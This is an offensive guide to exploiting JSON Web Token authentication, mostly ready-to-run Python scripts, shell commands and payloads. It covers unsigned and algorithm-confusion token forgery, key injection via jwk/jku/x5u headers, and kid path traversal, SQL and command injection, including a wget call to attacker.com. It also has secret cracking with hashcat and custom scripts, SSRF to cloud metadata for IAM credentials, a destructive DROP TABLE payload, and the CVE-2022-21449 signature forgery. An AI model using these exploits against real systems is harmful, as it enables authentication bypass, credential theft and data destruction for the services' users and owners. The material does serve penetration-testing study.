# JWT Attack Techniques - Comprehensive Guide

This guide covers practical JWT exploitation techniques, attack variations, bypass methods, and real-world application scenarios.

---

## Table of Contents

1. [JWT Fundamentals](#jwt-fundamentals)
2. [Attack Categories](#attack-categories)
3. [Signature Verification Attacks](#signature-verification-attacks)
4. [Header Parameter Exploitation](#header-parameter-exploitation)
5. [Secret Key Attacks](#secret-key-attacks)
6. [Algorithm Attacks](#algorithm-attacks)
7. [Token Manipulation Techniques](#token-manipulation-techniques)
8. [Advanced Exploitation](#advanced-exploitation)
9. [Bypass Techniques](#bypass-techniques)
10. [Real-World Attack Scenarios](#real-world-attack-scenarios)

---

## JWT Fundamentals

### Structure

A JWT consists of three Base64URL-encoded parts separated by dots:

```
HEADER.PAYLOAD.SIGNATURE
```

**Example JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Header

Contains metadata about the token:

```json
{
  "alg": "HS256",    // Signing algorithm
  "typ": "JWT",      // Token type
  "kid": "key-id-1"  // Key identifier (optional)
}
```

**Common Algorithms:**
- **HS256**: HMAC with SHA-256 (symmetric)
- **HS384**: HMAC with SHA-384 (symmetric)
- **HS512**: HMAC with SHA-512 (symmetric)
- **RS256**: RSA with SHA-256 (asymmetric)
- **RS384**: RSA with SHA-384 (asymmetric)
- **RS512**: RSA with SHA-512 (asymmetric)
- **ES256**: ECDSA with SHA-256 (asymmetric)
- **PS256**: RSA-PSS with SHA-256 (asymmetric)
- **none**: No signature (should be rejected)

### Payload

Contains claims (statements about an entity):

```json
{
  "sub": "user123",           // Subject (user identifier)
  "name": "John Doe",         // Custom claim
  "iat": 1516239022,          // Issued at (timestamp)
  "exp": 1516242622,          // Expiration time
  "nbf": 1516239022,          // Not before
  "iss": "https://auth.com",  // Issuer
  "aud": "https://api.com",   // Audience
  "jti": "unique-token-id"    // JWT ID
}
```

**Claim Types:**
- **Registered**: Predefined claims (sub, iss, exp, etc.)
- **Public**: Defined by JWT users (must avoid collisions)
- **Private**: Custom claims for information sharing

### Signature

Ensures token integrity and authenticity:

**HMAC (Symmetric):**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

**RSA (Asymmetric):**
```
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  privateKey
)
// Verified with publicKey
```

---

## Attack Categories

### 1. Signature Verification Flaws
- Missing signature verification
- Accepting unsigned tokens (alg=none)
- Improper verification implementation

### 2. Weak Cryptographic Secrets
- Brute-forceable HMAC secrets
- Default or hardcoded keys
- Insufficient key length

### 3. Header Parameter Injection
- jwk (JSON Web Key) injection
- jku (JWK Set URL) manipulation
- kid (Key ID) exploitation
- x5u/x5c certificate attacks

### 4. Algorithm Confusion
- RS256 to HS256 confusion
- Algorithm substitution
- Downgrade attacks

### 5. Token Manipulation
- Claim tampering
- Expiration bypass
- Privilege escalation via claims

### 6. Information Disclosure
- Sensitive data in payload
- Predictable token patterns
- Timing attacks

---

## Signature Verification Attacks

### Attack 1: Missing Signature Verification

**Vulnerability:**
Application decodes JWT without verifying signature.

**Vulnerable Code:**
```python
import jwt

# VULNERABLE - decode without verification
def authenticate(token):
    payload = jwt.decode(token, options={"verify_signature": False})
    return payload['sub']
```

**Exploitation:**
```python
import jwt

# Create arbitrary token
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "role": "administrator"}

# Encode without signing (signature is invalid but ignored)
token = jwt.encode(payload, "any-key", algorithm="HS256")

# Server accepts it because verification is disabled
```

**Manual Exploitation:**
```bash
# Decode existing token
echo "eyJ..." | base64 -d

# Modify payload
echo '{"sub":"admin"}' | base64

# Reconstruct with invalid signature
echo "eyJhbGc...new-payload...old-signature"
```

**Impact:**
- Complete authentication bypass
- Arbitrary identity assumption
- No cryptographic secret needed

**Detection:**
```python
# Check if verification is enabled
try:
    jwt.decode(token, verify=False)  # Red flag!
except:
    pass
```

---

### Attack 2: None Algorithm Acceptance

**Vulnerability:**
Server accepts tokens with `alg: none`, treating them as unsigned.

**Exploitation Steps:**

1. **Obtain valid JWT**
2. **Modify header to use "none" algorithm:**
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

3. **Modify payload as desired**
4. **Remove signature, keep trailing dot:**
```
header.payload.
```

**Exploitation Variations:**

**Variation 1: Exact "none"**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```

**Variation 2: Case manipulation**
```json
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
```

**Variation 3: Without trailing dot**
```
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9
```

**Variation 4: Empty signature**
```
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
```

**Python Script:**
```python
import base64
import json

def create_none_token(payload):
    header = {"alg": "none", "typ": "JWT"}

    # Base64URL encode
    header_encoded = base64.urlsafe_b64encode(
        json.dumps(header).encode()
    ).decode().rstrip('=')

    payload_encoded = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')

    # No signature
    return f"{header_encoded}.{payload_encoded}."

# Usage
token = create_none_token({"sub": "admin", "role": "administrator"})
print(token)
```

**Bypass Techniques:**

If "none" is filtered:
```python
# Try obfuscation
"None", "NONE", "nOnE", "NoNe"
"null", "NULL"
" none", "none "
"n\x00one"
```

**Detection in Code:**
```javascript
// Vulnerable pattern
if (header.alg === 'none') {
    // Should reject but might accept
}

// Better but still vulnerable
if (header.alg.toLowerCase() === 'none') {
    // Case-insensitive but might miss variations
}
```

---

### Attack 3: Weak Verification Logic

**Vulnerable Patterns:**

**Pattern 1: Empty Secret**
```python
jwt.verify(token, "", algorithms=['HS256'])
```

**Pattern 2: Null Secret**
```python
jwt.verify(token, None, algorithms=['HS256'])
```

**Pattern 3: Optional Verification**
```javascript
function verify(token, checkSignature = false) {
    if (checkSignature) {
        return jwt.verify(token, secret);
    }
    return jwt.decode(token);  // Bypassed!
}
```

**Exploitation:**
Test if empty/null secrets are accepted:
```python
import jwt

token = jwt.encode({"sub": "admin"}, "", algorithm="HS256")
# or
token = jwt.encode({"sub": "admin"}, b'\x00', algorithm="HS256")
```

---

## Header Parameter Exploitation

### JWK (JSON Web Key) Injection

**Vulnerability:**
Server trusts embedded public keys in JWT header.

**Attack Flow:**

1. **Generate RSA key pair**
2. **Embed public key in header**
3. **Sign with corresponding private key**
4. **Server uses embedded key for verification**

**Full Exploitation:**

```python
from jwcrypto import jwk, jwt
import json

# Step 1: Generate RSA key pair
key = jwk.JWK.generate(kty='RSA', size=2048)

# Step 2: Create header with embedded JWK
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jwk": json.loads(key.export_public())
}

# Step 3: Create payload
payload = {
    "sub": "administrator",
    "exp": 9999999999
}

# Step 4: Sign token with private key
token = jwt.JWT(
    header=header,
    claims=payload
)
token.make_signed_token(key)

print(token.serialize())
```

**Embedded JWK Structure:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": "attacker-key",
    "alg": "RS256",
    "n": "xGOr-H7A8JakwqmHC..."
  }
}
```

**Attack Variations:**

**Variation 1: Elliptic Curve (EC) Key**
```json
{
  "alg": "ES256",
  "jwk": {
    "kty": "EC",
    "crv": "P-256",
    "x": "f83OJ3D2xF1Bg8vub9tLe1gHMzV76e8Tus9uPHvRVEU",
    "y": "x_FEzRu9m36HLN_tue659LNpXW6pCyStikYjKIWI5a0"
  }
}
```

**Variation 2: Symmetric Key in JWK**
```json
{
  "alg": "HS256",
  "jwk": {
    "kty": "oct",
    "k": "c2VjcmV0"
  }
}
```

**Variation 3: JWK Set**
```json
{
  "alg": "RS256",
  "jwk": {
    "keys": [
      {"kty": "RSA", "kid": "key1", "n": "...", "e": "AQAB"}
    ]
  }
}
```

**Manual Testing:**
```bash
# Using jwt_tool
python3 jwt_tool.py <JWT> -X i

# Using custom script
python3 jwk_inject.py --token <JWT> --payload '{"sub":"admin"}'
```

---

### JKU (JWK Set URL) Injection

**Vulnerability:**
Server fetches verification keys from attacker-controlled URL.

**Attack Setup:**

**1. Host Malicious JWK Set:**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key-1",
      "use": "sig",
      "alg": "RS256",
      "n": "0vx7agoebGcQSuuPiLJXZptN...",
      "e": "AQAB"
    }
  ]
}
```

**2. Modify JWT Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "attacker-key-1",
  "jku": "https://attacker.com/jwks.json"
}
```

**3. Sign with Private Key**
**4. Server fetches keys from attacker URL**
**5. Token validated with attacker's public key**

**Hosting Options:**

**Option 1: Simple HTTP Server**
```bash
# Create jwks.json file
cat > jwks.json << 'EOF'
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attack-key",
      "use": "sig",
      "alg": "RS256",
      "n": "your-public-key-modulus",
      "e": "AQAB"
    }
  ]
}
EOF

# Serve
python3 -m http.server 8080
```

**Option 2: Cloud Storage**
```bash
# AWS S3
aws s3 cp jwks.json s3://bucket-name/jwks.json --acl public-read

# Use URL
https://bucket-name.s3.amazonaws.com/jwks.json
```

**Option 3: Ngrok Tunnel**
```bash
python3 -m http.server 8080 &
ngrok http 8080
# Use ngrok URL in jku parameter
```

**Advanced Attacks:**

**SSRF via JKU:**
```json
{
  "jku": "http://localhost:8080/admin/jwks.json"
}
```

**Internal Network Scan:**
```json
{
  "jku": "http://192.168.1.1:8080/jwks.json"
}
```

**Cloud Metadata Access:**
```json
{
  "jku": "http://169.254.169.254/latest/meta-data/"
}
```

**Bypass Domain Restrictions:**
```json
// URL parser confusion
{"jku": "https://trusted.com@attacker.com/jwks.json"}
{"jku": "https://trusted.com.attacker.com/jwks.json"}
{"jku": "https://attacker.com/trusted.com/jwks.json"}
```

---

### Kid (Key ID) Parameter Exploitation

**Vulnerability:**
Unsanitized kid parameter used in file operations or queries.

#### Path Traversal Attack

**Basic Exploitation:**
```json
{
  "alg": "HS256",
  "kid": "../../../../../../../etc/passwd"
}
```

**Common Targets:**

**1. /dev/null (Empty File)**
```json
{
  "kid": "../../../../../../../dev/null"
}
```
Sign with: `AA==` (Base64 null byte)

**2. /proc Files (Predictable Content)**
```json
{
  "kid": "../../../../../../../proc/sys/kernel/hostname"
}
```
If hostname is "server1", sign with: `c2VydmVyMQ==`

**3. Known Config Files**
```json
{
  "kid": "../../../../../../../app/config/public.key"
}
```

**4. Publicly Readable Files**
```json
{
  "kid": "../../../../../../../etc/hostname"
}
```

**Path Traversal Variations:**
```
../../../../../../../dev/null
..././..././..././dev/null
....//....//....//dev/null
..;/..;/..;/..;/dev/null
%2e%2e%2f%2e%2e%2f%2e%2e%2fdev/null
```

**Exploitation Script:**
```python
import jwt
import base64

# Target file: /dev/null (returns empty/null bytes)
header = {
    "alg": "HS256",
    "kid": "../../../../../../../dev/null"
}

payload = {
    "sub": "administrator"
}

# Secret: null byte (matches /dev/null content)
secret = base64.b64decode('AA==')  # \x00

token = jwt.encode(payload, secret, algorithm='HS256', headers=header)
print(token)
```

#### SQL Injection via Kid

**Vulnerable Query:**
```sql
SELECT key_data FROM keys WHERE kid = '{kid}'
```

**Exploitation:**
```json
{
  "kid": "' OR '1'='1"
}
```

**Union-Based Extraction:**
```json
{
  "kid": "x' UNION SELECT 'known-secret' --"
}
```
Then sign with: `known-secret`

**Boolean-Based Blind:**
```json
{
  "kid": "key1' AND 1=1 --"
}
```

#### Command Injection via Kid

**Vulnerable Code:**
```python
import subprocess

def load_key(kid):
    result = subprocess.run(f"cat /keys/{kid}.pem", shell=True)
    return result.stdout
```

**Exploitation:**
```json
{
  "kid": "key; cat /etc/passwd #"
}
```

**Variations:**
```json
{"kid": "key`whoami`"}
{"kid": "key$(cat /etc/passwd)"}
{"kid": "key;wget http://attacker.com/`whoami`"}
```

#### LDAP Injection via Kid

```json
{
  "kid": "*"
}
```

---

## Secret Key Attacks

### Brute Force Attack

**Tools:**

**1. Hashcat**
```bash
# Basic attack
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# With rules
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r rules/best64.rule

# Mask attack (pattern: secret + 4 digits)
hashcat -a 3 -m 16500 jwt.txt secret?d?d?d?d

# Modes:
# 16500 = JWT (HS256)
# 16511 = JWT (HS384)
# 16512 = JWT (HS512)
```

**2. John the Ripper**
```bash
# Convert JWT to John format
echo "<JWT>" > jwt.txt

# Crack
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt

# Show results
john --show jwt.txt
```

**3. jwt_tool**
```bash
# Crack secret
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# If secret found, forge token
python3 jwt_tool.py <JWT> -T -S hs256 -p <found-secret>
```

**4. Custom Python Script**
```python
import jwt
import sys

def crack_jwt(token, wordlist_file):
    with open(wordlist_file, 'r') as f:
        for line in f:
            secret = line.strip()
            try:
                jwt.decode(token, secret, algorithms=['HS256'])
                print(f"[+] Secret found: {secret}")
                return secret
            except jwt.InvalidSignatureError:
                continue
    print("[-] Secret not found")
    return None

# Usage
token = sys.argv[1]
wordlist = sys.argv[2]
crack_jwt(token, wordlist)
```

**Optimized Multi-threaded:**
```python
import jwt
import concurrent.futures
import itertools

def test_secret(token, secret):
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        return secret
    except:
        return None

def crack_jwt_parallel(token, wordlist_file, threads=10):
    with open(wordlist_file, 'r') as f:
        secrets = [line.strip() for line in f]

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(test_secret, token, secret): secret
                   for secret in secrets}

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print(f"[+] Secret found: {result}")
                executor.shutdown(wait=False)
                return result

    print("[-] Secret not found")
    return None
```

**Common Weak Secrets:**
```
secret
password
secret1
secret123
secretkey
mysecretkey
your-256-bit-secret
your-secret-key
changeit
admin
qwerty
123456
jwt_secret
```

**Wordlists:**
- jwt.secrets.list: JWT-specific secrets
- rockyou.txt: General passwords
- SecLists: Multiple wordlists

---

### Default Secret Detection

**Common Defaults by Framework:**

**Spring Boot:**
```
secret
spring-boot-secret
default-key
```

**Django:**
```
django-insecure-secret
secret-key-here
```

**Node.js:**
```
your-256-bit-secret
secret
secretkey
```

**ASP.NET:**
```
SecretKey123
MySecretKey
```

**Testing Script:**
```python
COMMON_DEFAULTS = [
    "secret",
    "secret1",
    "your-256-bit-secret",
    "your-secret-key",
    # ... more defaults
]

def test_defaults(token):
    for secret in COMMON_DEFAULTS:
        try:
            jwt.decode(token, secret, algorithms=['HS256'])
            print(f"[!] Using default secret: {secret}")
            return secret
        except:
            continue
    return None
```

---

### Timing Attacks

**Vulnerable Comparison:**
```python
def verify_signature(token, secret):
    expected = generate_signature(token, secret)
    actual = extract_signature(token)

    # Vulnerable: byte-by-byte comparison leaks timing
    for i in range(len(expected)):
        if expected[i] != actual[i]:
            return False
    return True
```

**Exploitation:**
```python
import time
import requests

def timing_attack(token_base, position):
    timings = {}

    for byte in range(256):
        # Try each possible byte value
        test_token = modify_signature_byte(token_base, position, byte)

        start = time.perf_counter()
        response = requests.post('/api/verify', json={'token': test_token})
        elapsed = time.perf_counter() - start

        timings[byte] = elapsed

    # Byte with longest response time is likely correct
    return max(timings, key=timings.get)

# Iteratively discover each byte of signature
secret_bytes = []
for i in range(32):  # 32 bytes for HS256
    byte = timing_attack(base_token, i)
    secret_bytes.append(byte)
```

---

## Algorithm Attacks

### Algorithm Confusion (RS256 → HS256)

**Detailed Attack Flow:**

**Step 1: Obtain Public Key**

**Method 1: JWKS Endpoint**
```bash
curl https://api.example.com/.well-known/jwks.json
```

**Method 2: Certificate Endpoint**
```bash
curl https://api.example.com/.well-known/openid-configuration
# Follow jwks_uri
```

**Method 3: Extract from Token**
```python
import jwt

token = "eyJ..."
header = jwt.get_unverified_header(token)
if 'jwk' in header:
    public_key = header['jwk']
```

**Method 4: X.509 Certificate**
```bash
openssl s_client -connect api.example.com:443 | openssl x509 -pubkey -noout > public.pem
```

**Step 2: Convert Public Key to HMAC Secret**

**From PEM:**
```python
import base64

with open('public.pem', 'rb') as f:
    pem_data = f.read()

# Option 1: Use PEM directly
secret = pem_data

# Option 2: Base64 encode PEM
secret = base64.b64encode(pem_data)

# Option 3: Extract raw modulus
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.backends import default_backend

key = load_pem_public_key(pem_data, backend=default_backend())
public_numbers = key.public_numbers()
n = public_numbers.n
secret = n.to_bytes((n.bit_length() + 7) // 8, 'big')
```

**From JWK:**
```python
import base64
import json

jwk = {
    "kty": "RSA",
    "n": "0vx7agoebGcQ...",
    "e": "AQAB"
}

# Option 1: Use entire JWK as JSON string
secret = json.dumps(jwk).encode()

# Option 2: Use modulus (n)
n_bytes = base64.urlsafe_b64decode(jwk['n'] + '==')
secret = n_bytes
```

**Step 3: Forge Token**

```python
import jwt

header = {
    "alg": "HS256",  # Changed from RS256
    "typ": "JWT"
}

payload = {
    "sub": "administrator",
    "exp": 9999999999
}

# Sign with public key as HMAC secret
token = jwt.encode(
    payload,
    public_key_pem,
    algorithm='HS256',
    headers=header
)
```

**Complete Attack Script:**
```python
import jwt
import requests
import base64

# Step 1: Fetch public key
response = requests.get('https://api.example.com/jwks.json')
jwks = response.json()
public_jwk = jwks['keys'][0]

# Step 2: Convert to PEM
from jwcrypto import jwk as jwk_lib
key = jwk_lib.JWK(**public_jwk)
public_pem = key.export_to_pem()

# Step 3: Create malicious token
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "role": "administrator"}

token = jwt.encode(
    payload,
    public_pem,
    algorithm='HS256',
    headers=header
)

# Step 4: Use token
response = requests.get(
    'https://api.example.com/admin',
    headers={'Authorization': f'Bearer {token}'}
)

print(response.status_code, response.text)
```

---

### Algorithm Substitution

**Downgrade Attacks:**

**RS512 → RS256:**
```json
// Original
{"alg": "RS512"}

// Downgrade
{"alg": "RS256"}
```

**Exploitation:**
If RS256 has known vulnerabilities or weaker keys.

**ES256 → ES256K:**
```json
{"alg": "ES256K"}  // Different curve, might be vulnerable
```

---

### None Algorithm Bypass

**Filter Evasion:**

**1. Case Variations:**
```
none, None, NONE, nOnE, NoNe, nOne, etc.
```

**2. Encoding:**
```
\u006eone  (Unicode escape)
no\x00ne  (Null byte injection)
none\r\n  (Newline injection)
```

**3. Whitespace:**
```
" none"
"none "
" none "
"\tnone"
```

**4. Type Confusion:**
```json
{"alg": null}
{"alg": 0}
{"alg": false}
{"alg": ""}
```

**5. Array/Object:**
```json
{"alg": ["none"]}
{"alg": {"value": "none"}}
```

**Testing Script:**
```python
NONE_VARIATIONS = [
    "none", "None", "NONE", "nOnE",
    " none", "none ", " none ",
    "no\x00ne", "\\u006eone",
    "null", "NULL", "", "0"
]

def test_none_variations(base_token, payload):
    for variation in NONE_VARIATIONS:
        header = {"alg": variation, "typ": "JWT"}
        token = create_unsigned_token(header, payload)

        response = test_token(token)
        if response.status_code == 200:
            print(f"[+] Accepted variation: {repr(variation)}")
            return token
```

---

## Token Manipulation Techniques

### Claim Tampering

**Common Claims to Modify:**

**1. Identity Claims:**
```json
{
  "sub": "admin",           // Change to target user
  "user_id": "1",           // Administrative user ID
  "username": "administrator",
  "email": "admin@example.com"
}
```

**2. Authorization Claims:**
```json
{
  "role": "admin",
  "roles": ["admin", "superuser"],
  "permissions": ["read", "write", "delete"],
  "scope": "admin:all",
  "is_admin": true,
  "privilege": 100
}
```

**3. Temporal Claims:**
```json
{
  "exp": 9999999999,        // Far future expiration
  "iat": 0,                 // Issued at epoch
  "nbf": 0                  // Not before epoch
}
```

**4. Context Claims:**
```json
{
  "iss": "trusted-issuer",
  "aud": "privileged-audience",
  "jti": "bypass-token-123"
}
```

### Expiration Bypass

**Technique 1: Far Future Expiration**
```python
import time

exp = int(time.time()) + (365 * 24 * 60 * 60 * 10)  # 10 years
payload = {"sub": "user", "exp": exp}
```

**Technique 2: Remove Expiration**
```python
# Original
{"sub": "user", "exp": 1516239022}

# Modified (remove exp claim)
{"sub": "user"}
```

**Technique 3: Negative Expiration**
```python
{"sub": "user", "exp": -1}
```

**Technique 4: Non-Integer Expiration**
```python
{"sub": "user", "exp": "never"}
{"sub": "user", "exp": null}
```

---

### Payload Injection

**JSON Injection:**

**Technique 1: Additional Claims**
```json
{
  "sub": "user",
  "role": "user",
  "admin": true  // Add privileged claim
}
```

**Technique 2: Overwrite via Duplicate Keys**
```json
{
  "role": "user",
  "role": "admin"  // Some parsers use last value
}
```

**Technique 3: Nested Object Injection**
```json
{
  "user": {
    "id": "123",
    "role": "user"
  },
  "role": "admin"  // Top-level override
}
```

**Technique 4: Array Manipulation**
```json
{
  "roles": ["user", "admin"]  // Add admin to roles array
}
```

---

### Header Injection

**Technique 1: Multiple kid Parameters**
```json
{
  "alg": "HS256",
  "kid": "safe-key",
  "kid": "../../../etc/passwd"  // May use last value
}
```

**Technique 2: Header Parameter Pollution**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {...},
  "jku": "https://attacker.com/jwks.json",
  "kid": "../../dev/null"
}
```

---

## Advanced Exploitation

### CVE-2022-21449: Psychic Signatures

**Vulnerability:**
Java's ECDSA signature verification accepted signatures where r=0 and s=0.

**Affected Versions:**
- Java 15.0.0 to 15.0.6
- Java 16.0.0 to 16.0.1
- Java 17.0.0 to 17.0.2
- Java 18.0.0

**Exploitation:**

```python
import base64
import json

# Create token with ES256 algorithm
header = {
    "alg": "ES256",
    "typ": "JWT"
}

payload = {
    "sub": "administrator",
    "exp": 9999999999
}

# Encode header and payload
header_enc = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

payload_enc = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

# Create invalid signature: r=0, s=0
# ECDSA signature format: 0x30 || length || 0x02 || r_length || r || 0x02 || s_length || s
# For r=0, s=0:
invalid_signature = bytes([
    0x30, 0x06,  # SEQUENCE, length 6
    0x02, 0x01, 0x00,  # INTEGER (r), length 1, value 0
    0x02, 0x01, 0x00   # INTEGER (s), length 1, value 0
])

signature_enc = base64.urlsafe_b64encode(invalid_signature).decode().rstrip('=')

# Construct token
psychic_token = f"{header_enc}.{payload_enc}.{signature_enc}"
print(psychic_token)
```

**Testing:**
```bash
# Test against vulnerable Java application
curl -H "Authorization: Bearer $psychic_token" \
     https://vulnerable-app.com/admin
```

---

### X.509 Certificate Exploitation

**x5u (X.509 URL) Parameter:**

Similar to jku, but for X.509 certificates.

```json
{
  "alg": "RS256",
  "x5u": "https://attacker.com/malicious-cert.pem"
}
```

**x5c (X.509 Certificate Chain):**

Embed certificate directly in header.

```json
{
  "alg": "RS256",
  "x5c": [
    "MIID...",  // Base64-encoded certificate
    "MIIC..."   // Optional chain
  ]
}
```

**Exploitation:**

1. Generate self-signed certificate
2. Embed via x5c or host via x5u
3. Sign token with private key
4. Server trusts embedded certificate

---

### Kid Parameter SQL Injection

**Detailed Exploitation:**

**Vulnerable Code:**
```python
def get_key(kid):
    query = f"SELECT key FROM keys WHERE kid = '{kid}'"
    result = db.execute(query)
    return result[0]['key']
```

**Exploitation Payloads:**

**1. Authentication Bypass:**
```json
{"kid": "' OR '1'='1"}
```
Returns first key in database.

**2. Union-Based Injection:**
```json
{"kid": "x' UNION SELECT 'known-secret' --"}
```
Returns attacker-controlled value as key.

**3. Time-Based Blind:**
```json
{"kid": "' OR SLEEP(5) --"}
```
Test if vulnerable via response time.

**4. Error-Based:**
```json
{"kid": "' AND 1=CAST((SELECT key FROM keys LIMIT 1) AS INT) --"}
```
Leak key via error messages.

**5. Stacked Queries:**
```json
{"kid": "'; DROP TABLE keys; --"}
```
Potentially destructive (use with caution in authorized testing).

**Complete Attack:**
```python
import jwt
import requests

# Step 1: SQL injection to return known secret
kid_payload = "x' UNION SELECT 'my-known-secret' --"
header = {"alg": "HS256", "kid": kid_payload}
payload = {"sub": "admin"}

# Step 2: Sign with the known secret
token = jwt.encode(
    payload,
    "my-known-secret",
    algorithm='HS256',
    headers=header
)

# Step 3: Use token
response = requests.get(
    'https://api.example.com/admin',
    headers={'Authorization': f'Bearer {token}'}
)
```

---

### JWKS Poisoning

**Attack Scenario:**
Poison cached JWKS to inject attacker's public key.

**Technique 1: Cache Poisoning**

If application caches JWKS responses:

1. Trigger JWKS fetch with crafted response
2. Application caches attacker's key
3. Use cached key for verification

**Technique 2: JWKS Endpoint Takeover**

If JWKS URL is hijackable:

1. Register expired domain
2. Host malicious JWKS
3. Old tokens use attacker's keys

---

## Bypass Techniques

### Algorithm Whitelist Bypass

**Technique 1: Algorithm Aliases**
```json
{"alg": "RS256"} -> {"alg": "RSA256"}
{"alg": "HS256"} -> {"alg": "HS2"}
```

**Technique 2: Unknown Algorithms**
```json
{"alg": "RS256"}
{"alg": "RSA-SHA256"}
{"alg": "SHA256withRSA"}
```

**Technique 3: Custom Algorithms**
```json
{"alg": "custom-hmac"}
{"alg": "internal-rsa"}
```

---

### Signature Stripping

**Technique 1: Remove Signature Component**
```
Original: header.payload.signature
Modified: header.payload.
```

**Technique 2: Empty Signature**
```
header.payload.
```

**Technique 3: Null Signature**
```python
signature = base64.urlsafe_b64encode(b'\x00').decode()
token = f"{header}.{payload}.{signature}"
```

---

### Token Replay

**Technique 1: Reuse Valid Token**
```bash
# Capture valid admin token
admin_token="eyJ..."

# Replay from different context
curl -H "Authorization: Bearer $admin_token" \
     https://api.example.com/admin/users
```

**Technique 2: Bypass JTI (JWT ID) Check**
```json
// Original
{"jti": "abc123", "sub": "admin"}

// Modified (remove jti)
{"sub": "admin"}
```

**Technique 3: Expire Time Manipulation**
```python
# Capture token before expiration
# Modify exp claim to extend validity
```

---

### Cross-Service Token Abuse

**Technique 1: Audience Bypass**
```json
// Token for service A
{"aud": "service-a", "sub": "user"}

// Use for service B (if aud not validated)
```

**Technique 2: Issuer Spoofing**
```json
{"iss": "trusted-issuer", "sub": "admin"}
```

**Technique 3: Multi-Tenant Bypass**
```json
{"tenant_id": "victim-tenant", "sub": "attacker"}
```

---

## Real-World Attack Scenarios

### Scenario 1: E-Commerce Privilege Escalation

**Target:** Online store with JWT authentication

**Attack Flow:**

1. **Register normal user account**
2. **Capture JWT after login**
```json
{
  "user_id": "12345",
  "email": "attacker@example.com",
  "role": "customer",
  "exp": 1709987656
}
```

3. **Test for weak secret**
```bash
hashcat -a 0 -m 16500 token.txt jwt.secrets.list
# Found: secret123
```

4. **Forge admin token**
```python
token = jwt.encode({
    "user_id": "1",
    "email": "admin@store.com",
    "role": "admin",
    "exp": 9999999999
}, "secret123", algorithm="HS256")
```

5. **Access admin panel**
```bash
curl -H "Authorization: Bearer $admin_token" \
     https://store.com/admin/orders
```

6. **Impact:**
   - Access all customer orders
   - Modify prices
   - Export customer data

---

### Scenario 2: API Key Extraction via Kid Traversal

**Target:** Microservices API with file-based key storage

**Attack Flow:**

1. **Obtain valid JWT**
```json
{
  "alg": "HS256",
  "kid": "api-key-prod"
}
```

2. **Test path traversal**
```json
{
  "kid": "../../../../../etc/passwd"
}
```

3. **Read application configuration**
```json
{
  "kid": "../../../../../app/config/.env"
}
```

4. **If successful, extract:**
   - API keys
   - Database credentials
   - Other JWT secrets

5. **Sign tokens with extracted secrets**

---

### Scenario 3: Algorithm Confusion in Microservices

**Target:** OAuth2/OIDC Identity Provider

**Attack Flow:**

1. **Discover JWKS endpoint**
```bash
curl https://auth.company.com/.well-known/openid-configuration
# Returns: jwks_uri: https://auth.company.com/jwks.json
```

2. **Fetch public keys**
```bash
curl https://auth.company.com/jwks.json
```

3. **Extract RSA public key (PEM format)**
```python
from jwcrypto import jwk
import json

jwks = json.loads(jwks_response)
key = jwk.JWK(**jwks['keys'][0])
public_pem = key.export_to_pem()
```

4. **Convert to HMAC secret**
```python
import base64
secret = base64.b64encode(public_pem)
```

5. **Forge HS256 token**
```python
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "admin@company.com",
    "scope": "admin",
    "iss": "https://auth.company.com",
    "aud": "internal-services",
    "exp": 9999999999
}
token = jwt.encode(payload, secret, algorithm='HS256', headers=header)
```

6. **Access internal microservices**
```bash
curl -H "Authorization: Bearer $token" \
     https://internal.company.com/admin/users
```

---

### Scenario 4: JKU SSRF to Cloud Metadata

**Target:** Cloud-hosted application (AWS/GCP/Azure)

**Attack Flow:**

1. **Identify JKU support**
```json
{
  "alg": "RS256",
  "jku": "https://auth.app.com/.well-known/jwks.json"
}
```

2. **Test SSRF via JKU**
```json
{
  "jku": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

3. **Observe response time/error**
   - Successful fetch: Normal response
   - Failed fetch: Timeout/error

4. **Extract cloud credentials**
```json
{
  "jku": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role"
}
```

5. **Response might contain:**
```json
{
  "keys": [...]  // Invalid JWK but server fetched it
}
```

6. **Leverage timing/error information to:**
   - Map internal network
   - Access metadata service
   - Exfiltrate credentials

---

### Scenario 5: Multi-Tenant Data Access

**Target:** SaaS application with tenant isolation

**Attack Flow:**

1. **Register in Tenant A**
```json
{
  "user_id": "123",
  "tenant_id": "tenant-a",
  "role": "user"
}
```

2. **Discover Tenant B exists**
3. **Modify tenant_id in JWT**
```json
{
  "user_id": "123",
  "tenant_id": "tenant-b",
  "role": "user"
}
```

4. **Test if signature is verified**
